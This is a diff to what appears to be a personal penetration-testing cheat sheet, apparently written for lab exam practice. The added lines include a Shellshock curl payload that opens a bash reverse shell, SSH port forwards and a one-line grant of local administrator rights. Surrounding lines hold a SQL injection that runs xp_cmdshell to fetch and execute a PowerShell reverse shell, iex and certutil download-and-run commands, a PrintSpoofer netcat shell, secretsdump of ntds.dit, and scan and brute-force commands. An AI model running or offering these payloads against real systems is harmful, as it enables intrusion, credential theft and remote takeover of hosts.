@@ -4,17 +4,41 @@ Dump Secrets Such as SYSTEM and ntds.dit:
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -sam SAM LOCAL
 ```
 
+Shellshock:
+
+```bash
+nikto -ask=no -h http://10.11.1.71:80 2>&1
+OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability
+
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
+http://10.11.1.71:80/cgi-bin/admin.cgi
+```
+
+Local port forward:
+
+```bash
+ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
+# On the box running on port 80, want it to be on my machine
+ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.239.99
+```
+
+Elevate privileges of a user you have access to with a single command:
+
+```bash
+Add-LocalGroupMember -Group Administrators -Member ariah
+```
+
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
-iex(iwr -uri 192.168.45.163:8000/transfer_files.ps1 -usebasicparsing)
+iex(iwr -uri 192.168.45.187:8000/transfer_files.ps1 -usebasicparsing)
 
 iex(iwr -uri 192.168.49.129:8000/transfer_files.ps1 -usebasicparsing)
 
 iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
 certutil.exe -f -urlcache -split http://192.168.49.129:8000/nc.exe nc.exe
 
-certutil.exe -f -urlcache -split http://192.168.45.163:8000/
+certutil.exe -f -urlcache -split http://192.168.45.187:8000/
 
 # Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
 .\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.163 6969"
@@ -39,7 +63,7 @@ curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
 
 ===Nmap====
 nmap -p- -sT -sV -A $IP
-nmap -p- -sC -sV $IP --open
+nmap -p- -sC -sV $ip --open
 nmap -p- --script=vuln $IP
 ###HTTP-Methods
 nmap --script http-methods --script-args http-methods.url-path='/website' 
@@ -58,7 +82,7 @@ wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.
 wpscan --url $URL --enumerate p --plugins-detection aggressive
 ================================================================================
 ===Nikto with SSL and Evasion
-nikto --host $IP -ssl -evasion 1
+nikto --host $ip -ssl -evasion 1
 SEE EVASION MODALITIES.
 ================================================================================
 ===dns_recon
